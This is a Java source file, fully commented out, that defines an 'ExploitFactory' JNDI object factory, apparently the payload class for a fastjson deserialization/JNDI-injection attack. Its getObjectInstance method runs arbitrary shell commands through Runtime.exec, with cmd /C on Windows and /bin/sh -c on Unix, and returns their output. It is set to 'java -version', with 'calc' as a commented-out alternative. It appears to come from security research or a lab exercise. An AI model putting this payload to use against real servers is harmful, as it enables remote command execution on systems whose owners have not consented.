package fastjson;//
//import javax.naming.Context;
//import javax.naming.Name;
//import javax.naming.spi.ObjectFactory;
//import java.io.*;
//import java.util.Hashtable;
//
///*
//from 深夜饮酒
// */
//public class ExploitFactory implements ObjectFactory {
//
//    @Override
//    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
//        System.out.println("getObjectInstance");
//        //Runtime.getRuntime().exec("calc");
//        return exec("java -version");
//    }
//
////    public static String exec(String cmd) {
////        try {
////            String sb = "";
////            BufferedInputStream in = new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());
////            BufferedReader inBr = new BufferedReader(new InputStreamReader(in, System.getProperty("file.encoding")));
////            String lineStr;
////            while ((lineStr = inBr.readLine()) != null)
////                sb += lineStr + "\n";
////            inBr.close();
////            in.close();
////            return sb;
////        } catch (Exception e) {
////            return "";
////        }
////    }
//
//    public static String exec(String cmd) throws Exception {
//        Runtime runtime = Runtime.getRuntime();
//
//        StringBuffer errLog = new StringBuffer();
//
//        String[] param = new String[3];
//
//        String osName = System.getProperty("os.name");
//        if (osName.startsWith("Mac OS")) {
//            // 苹果
//        } else if (osName.startsWith("Windows")) {
//            // windows
//            param[0] = "cmd";
//            param[1] = "/C";
//            param[2] = "GBK";
//        } else {
//            // unix or linux
//            param[0] = "/bin/sh";
//            param[1] = "-c";
//            param[2] = "UTF-8";
//        }
//
//        Process process = runtime.exec(new String[]{param[0], param[1], cmd});
//        InputStream inputStream = process.getInputStream();
//        BufferedReader inputStreamReader = new BufferedReader(new InputStreamReader(inputStream, param[2]));
//        InputStream errorStream = process.getErrorStream();
//        BufferedReader errorStreamReader = new BufferedReader(new InputStreamReader(errorStream, param[2]));
//
//        Thread std = new Thread(() -> {
//            try {
//                String line = null;
//                while ((line = inputStreamReader.readLine()) != null) {
//                    System.out.println(line);
//                }
//            } catch (Exception e) {
//                errLog.append(e.getMessage());
//            }
//        });
//        Thread err = new Thread(() -> {
//            try {
//                String line = null;
//                while ((line = errorStreamReader.readLine()) != null) {
//                    errLog.append(line);
//                }
//            } catch (Exception e) {
//                errLog.append(e.getMessage());
//            }
//
//        });
//        std.start();
//        err.start();
//        std.join();
//        err.join();
//        process.waitFor();
//
//        return errLog.toString();
//    }
//
//}
